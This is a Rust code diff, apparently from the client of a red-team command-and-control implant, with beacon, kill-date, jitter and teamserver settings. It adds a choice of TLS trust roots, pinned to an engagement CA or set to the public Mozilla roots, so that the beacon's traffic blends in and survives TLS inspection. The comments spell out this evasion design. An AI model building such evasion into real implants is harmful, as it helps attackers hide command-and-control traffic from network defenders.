@@ -12,29 +12,47 @@ use rustls::RootCertStore;
 use crate::error::ContactError;
 use crate::profile::Profile;
 use crate::session::{Attempt, Session};
-use crate::trust::Certificate;
 
-/// The HTTP carriage builder the poll client rides: plain http for the
-/// documented cleartext web posture (the sealed contact body carries the
-/// confidentiality), https with the teamserver CA pinned for the TLS front
-/// (full webpki validation against the baked CAs as the only roots, no
-/// system store consulted).
-pub fn build_agent(url: &str, pinned_cas: &[Certificate], timeout_seconds: f64) -> ureq::Agent {
+/// The TLS trust roots a profile dials under (architecture.md Sec 9). The
+/// pinned bake is the default: the engagement CA the only root, no
+/// public-PKI or system-store dependence. The public posture is the
+/// real-domain front whose certificate a public CA issued -- the dials
+/// validate like an ordinary client against the compiled-in Mozilla root
+/// set, the blend that survives TLS inspection.
+pub fn tls_roots(profile: &Profile) -> RootCertStore {
+    if profile.public_tls() {
+        RootCertStore {
+            roots: webpki_roots::TLS_SERVER_ROOTS.to_vec(),
+        }
+    } else {
+        let mut roots = RootCertStore::empty();
+        for der in crate::trust::parse_pem(&profile.ca_pem) {
+            let _ = roots.add(CertificateDer::from(der));
+        }
+        roots
+    }
+}
+
+/// The HTTP carriage builder the enroll and poll clients ride: plain http
+/// for the documented cleartext web posture (the sealed contact body carries
+/// the confidentiality), https under the profile's trust posture for the TLS
+/// front. A pinned bake with no CAs keeps the builder's default validation
+/// (the dev shape); the public posture always names the Mozilla set.
+pub fn build_agent(url: &str, profile: &Profile, timeout_seconds: f64) -> ureq::Agent {
     let mut builder =
         ureq::AgentBuilder::new().timeout(Duration::from_secs_f64(timeout_seconds.max(1.0)));
-    if url.starts_with("https://") && !pinned_cas.is_empty() {
-        let mut roots = RootCertStore::empty();
-        for ca in pinned_cas {
-            let _ = roots.add(CertificateDer::from(ca.raw.clone()));
+    if url.starts_with("https://") {
+        let roots = tls_roots(profile);
+        if !roots.is_empty() {
+            let config = rustls::ClientConfig::builder_with_provider(Arc::new(
+                rustls::crypto::ring::default_provider(),
+            ))
+            .with_safe_default_protocol_versions()
+            .expect("rustls protocol versions")
+            .with_root_certificates(roots)
+            .with_no_client_auth();
+            builder = builder.tls_config(Arc::new(config));
         }
-        let config = rustls::ClientConfig::builder_with_provider(Arc::new(
-            rustls::crypto::ring::default_provider(),
-        ))
-        .with_safe_default_protocol_versions()
-        .expect("rustls protocol versions")
-        .with_root_certificates(roots)
-        .with_no_client_auth();
-        builder = builder.tls_config(Arc::new(config));
     }
     builder.build()
 }
@@ -196,6 +214,7 @@ mod tests {
             beacon_url: String::new(),
             fallback_enroll_urls: Vec::new(),
             ca_pem: String::new(),
+            tls_trust: "pinned".into(),
             kill_date: None,
             sleep_seconds: 30.0,
             jitter_seconds: 10.0,
@@ -208,6 +227,20 @@ mod tests {
             token: String::new(),
             verbs: Vec::new(),
         }
+    }
+
+    #[test]
+    fn tls_roots_follow_the_baked_posture() {
+        // Pinned is the default and reads only the baked CA -- an empty bake
+        // carries no roots (the dev shape keeps the builder's default
+        // validation). The public posture names the compiled-in Mozilla
+        // set: the real-domain front validated like an ordinary client.
+        let pinned = profile();
+        assert!(super::tls_roots(&pinned).is_empty());
+
+        let mut public = profile();
+        public.tls_trust = "public".into();
+        assert!(super::tls_roots(&public).len() > 50);
     }
 
     #[test]
